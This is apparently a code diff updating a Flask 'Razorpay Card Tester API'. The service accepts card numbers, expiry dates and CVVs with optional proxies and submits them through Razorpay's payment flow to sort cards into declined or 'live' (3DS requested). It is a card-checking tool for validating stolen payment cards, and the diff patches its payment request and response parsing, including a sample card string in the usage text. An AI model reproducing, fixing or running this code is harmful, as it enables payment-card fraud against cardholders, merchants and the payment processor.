@@ -1,4 +1,4 @@
-# app.py - Enhanced redirect URL extraction
+# app.py - Fixed currency validation error
 from flask import Flask, request, jsonify
 import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
 from urllib.parse import quote, urlparse, parse_qs, unquote
@@ -46,89 +46,6 @@ def find_between(content, start, end):
     except ValueError:
         return ""
 
-def extract_redirect_url_enhanced(html_content):
-    """Enhanced extraction of 3DS redirect URL from HTML response"""
-    
-    # Pattern 1: window.location.href
-    patterns = [
-        r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
-        r'window\.location\.replace\s*\(["\']([^"\']+)["\']\)',
-        r'window\.location\.assign\s*\(["\']([^"\']+)["\']\)',
-        r'location\.href\s*=\s*["\']([^"\']+)["\']',
-        r'document\.location\s*=\s*["\']([^"\']+)["\']',
-        r'top\.location\s*=\s*["\']([^"\']+)["\']',
-        r'parent\.location\s*=\s*["\']([^"\']+)["\']',
-        r'self\.location\s*=\s*["\']([^"\']+)["\']',
-    ]
-    
-    for pattern in patterns:
-        match = re.search(pattern, html_content, re.IGNORECASE)
-        if match:
-            url = match.group(1)
-            # Decode HTML entities
-            url = url.replace('&amp;', '&').replace('&#39;', "'")
-            return url
-    
-    # Pattern 2: Meta refresh
-    meta_match = re.search(r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\'][^"\']*url=([^"\']+)["\']', html_content, re.IGNORECASE)
-    if meta_match:
-        return meta_match.group(1)
-    
-    # Pattern 3: Form action
-    form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
-    if form_match:
-        return form_match.group(1)
-    
-    # Pattern 4: Iframe src
-    iframe_match = re.search(r'<iframe[^>]+src=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
-    if iframe_match:
-        return iframe_match.group(1)
-    
-    # Pattern 5: JavaScript variables with URL
-    var_patterns = [
-        r'var\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
-        r'var\s+redirectURL\s*=\s*["\']([^"\']+)["\']',
-        r'var\s+url\s*=\s*["\']([^"\']+)["\']',
-        r'var\s+redirect_uri\s*=\s*["\']([^"\']+)["\']',
-        r'let\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
-        r'const\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
-    ]
-    
-    for pattern in var_patterns:
-        match = re.search(pattern, html_content, re.IGNORECASE)
-        if match:
-            url = match.group(1)
-            if url.startswith('http'):
-                return url
-    
-    # Pattern 6: Look for any URL in the HTML that's not Razorpay/CDN
-    url_pattern = re.compile(r'https?://[^\s"\'<>(){}[\]]+')
-    urls = url_pattern.findall(html_content)
-    
-    # Filter URLs - look for bank/3ds domains
-    for url in urls:
-        # Skip Razorpay/CDN/Google/Fonts
-        if any(skip in url.lower() for skip in ['razorpay', 'cdn', 'google', 'font', 'gstatic', 'cloudflare']):
-            continue
-        # Look for 3ds or acs in URL
-        if '3ds' in url.lower() or 'acs' in url.lower() or 'auth' in url.lower():
-            return url
-    
-    # Pattern 7: Look for encoded redirect URL in script
-    encoded_match = re.search(r'redirect_url["\']?\s*[:=]\s*["\']([^"\']+)["\']', html_content, re.IGNORECASE)
-    if encoded_match:
-        url = encoded_match.group(1)
-        # Try to decode if it's URL encoded
-        try:
-            decoded = unquote(url)
-            if decoded.startswith('http'):
-                return decoded
-        except:
-            pass
-        return url
-    
-    return None
-
 def parse_proxy(proxy_string):
     """Parse proxy string: host:port:user:pass or host:port"""
     if not proxy_string:
@@ -149,8 +66,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
         "message": "Unknown error",
         "raw_json": None,
         "card": f"{cc[:6]}******{cc[-4:]}",
-        "redirect_url": None,
-        "redirect_html": None
+        "redirect_url": None
     }
     
     try:
@@ -327,7 +243,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             timeout=30
         )
         
-        # STEP 6: Create payment
+        # STEP 6: Create payment - FIXED currency_request_id
         headers_create = {
             'Accept': '*/*', 
             'Content-type': 'application/x-www-form-urlencoded', 
@@ -357,7 +273,9 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'key_id': kyid,
             'contact': PHONE, 
             'email': EMAIL, 
-            'currency': 'INR', 
+            'currency': 'INR',
+            # FIX: Add currency_request_id to fix the validation error
+            'currency_request_id': 'INR', 
             '_[integration]': 'payment_pages',
             '_[checkout_id]': checkout_id, 
             '_[device.id]': rzp_device_id, 
@@ -400,38 +318,37 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
         # STEP 7: Parse response
         result["raw_json"] = {}
         
-        # Check if it's HTML (3DS redirect)
+        # Check if it's HTML (error page or 3DS)
         if 'text/html' in resp_create.headers.get('Content-Type', ''):
+            # Extract error from HTML if present
+            error_match = re.search(r'var data = ({.*?});', resp_create.text, re.DOTALL)
+            if error_match:
+                try:
+                    error_data = json.loads(error_match.group(1))
+                    if error_data.get('error'):
+                        result["status"] = "declined"
+                        result["message"] = f"Payment declined: {error_data['error'].get('description', 'Unknown error')}"
+                        result["raw_json"] = error_data
+                        return result
+                except:
+                    pass
+            
+            # If no error found, treat as 3DS
             result["status"] = "3ds_required"
             result["message"] = "3DS authentication required - card is live"
             result["raw_json"] = {"redirect": True, "message": "3DS OTP required"}
             
-            # Store HTML for analysis
-            result["redirect_html"] = resp_create.text[:2000]  # First 2000 chars
-            
-            # Extract redirect URL with enhanced function
-            redirect_url = extract_redirect_url_enhanced(resp_create.text)
-            if redirect_url:
-                result["redirect_url"] = redirect_url
-                result["raw_json"]["redirect_url"] = redirect_url
-                
-                # Try to extract payment ID from redirect URL
-                payment_match = re.search(r'payment_id=([^&]+)', redirect_url)
-                if payment_match:
-                    result["raw_json"]["payment_id"] = payment_match.group(1)
+            # Try to extract redirect URL
+            redirect_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', resp_create.text)
+            if redirect_match:
+                result["redirect_url"] = redirect_match.group(1)
+                result["raw_json"]["redirect_url"] = redirect_match.group(1)
             else:
-                # Try to extract from JavaScript using regex
-                js_pattern = r'("|\')redirectUrl("|\')\s*[:=]\s*("|\')([^"\']+)("|\')'
-                js_match = re.search(js_pattern, resp_create.text, re.IGNORECASE)
-                if js_match:
-                    result["redirect_url"] = js_match.group(4)
-                    result["raw_json"]["redirect_url"] = js_match.group(4)
-                
-                # Look for any URL with payment_id
+                # Look for any URL in the HTML
                 url_pattern = re.compile(r'https?://[^\s"\'<>(){}[\]]+')
                 urls = url_pattern.findall(resp_create.text)
                 for url in urls:
-                    if 'payment_id' in url or 'pay_' in url:
+                    if 'razorpay' not in url and 'cdn' not in url:
                         result["redirect_url"] = url
                         result["raw_json"]["redirect_url"] = url
                         break
@@ -472,9 +389,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
                 if pay_json.get("request", {}).get("url"):
                     result["redirect_url"] = pay_json["request"]["url"]
                     result["raw_json"]["redirect_url"] = pay_json["request"]["url"]
-                elif pay_json.get("url"):
-                    result["redirect_url"] = pay_json["url"]
-                    result["raw_json"]["redirect_url"] = pay_json["url"]
                 return result
             
             # Unknown response
@@ -485,12 +399,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             result["status"] = "unknown"
             result["message"] = "Non-JSON response received"
             result["raw_json"] = {"raw_response": resp_create.text[:500]}
-            
-            # Try to extract redirect URL from raw response
-            redirect_url = extract_redirect_url_enhanced(resp_create.text)
-            if redirect_url:
-                result["redirect_url"] = redirect_url
-                result["raw_json"]["redirect_url"] = redirect_url
         
         return result
         
@@ -505,7 +413,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
 def home():
     return jsonify({
         "service": "Razorpay Card Tester API",
-        "version": "1.1",
+        "version": "1.2",
         "endpoints": {
             "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
         },
@@ -516,12 +424,10 @@ def home():
 @app.route('/test', methods=['GET'])
 def test_endpoint():
     """Main endpoint for testing cards"""
-    # Get parameters
     cc_param = request.args.get('cc')
     site_param = request.args.get('site')
     proxy_param = request.args.get('proxy')
     
-    # Validate card parameter
     if not cc_param:
         return jsonify({
             "status": "error",
@@ -529,7 +435,6 @@ def test_endpoint():
             "example": "cc=4342562526966146|08|2029|292"
         }), 400
     
-    # Parse card details
     try:
         parts = cc_param.split('|')
         if len(parts) != 4:
@@ -543,53 +448,30 @@ def test_endpoint():
         yy = parts[2].strip()[-2:]
         cvv = parts[3].strip()
         
-        # Basic validation
         if not cc.isdigit() or len(cc) < 12:
-            return jsonify({
-                "status": "error",
-                "message": "Invalid card number"
-            }), 400
-            
+            return jsonify({"status": "error", "message": "Invalid card number"}), 400
         if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
-            return jsonify({
-                "status": "error",
-                "message": "Invalid month"
-            }), 400
-            
+            return jsonify({"status": "error", "message": "Invalid month"}), 400
         if not yy.isdigit() or len(yy) != 2:
-            return jsonify({
-                "status": "error",
-                "message": "Invalid year (use 2 digits)"
-            }), 400
-            
+            return jsonify({"status": "error", "message": "Invalid year (use 2 digits)"}), 400
         if not cvv.isdigit() or len(cvv) < 3:
-            return jsonify({
-                "status": "error",
-                "message": "Invalid CVV"
-            }), 400
+            return jsonify({"status": "error", "message": "Invalid CVV"}), 400
             
     except Exception as e:
-        return jsonify({
-            "status": "error",
-            "message": f"Failed to parse card: {str(e)}"
-        }), 400
+        return jsonify({"status": "error", "message": f"Failed to parse card: {str(e)}"}), 400
     
-    # Log request
     print(f"📥 Request received:")
     print(f"   Card: {cc[:6]}******{cc[-4:]}")
     print(f"   Site: {site_param}")
     print(f"   Proxy: {proxy_param[:30] if proxy_param else 'None'}...")
     
-    # Test the card
     result = test_card_on_razorpay(cc, mm, yy, cvv, proxy_param)
     
-    # Add site information if provided
     if site_param:
         result["site"] = site_param
         if result.get("raw_json") and isinstance(result["raw_json"], dict):
             result["raw_json"]["site"] = site_param
     
-    # Return the result
     return jsonify(result)
 
 @app.route('/health', methods=['GET'])
@@ -599,7 +481,6 @@ def health():
         "timestamp": time.time()
     })
 
-# ========== RUN THE APP ==========
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
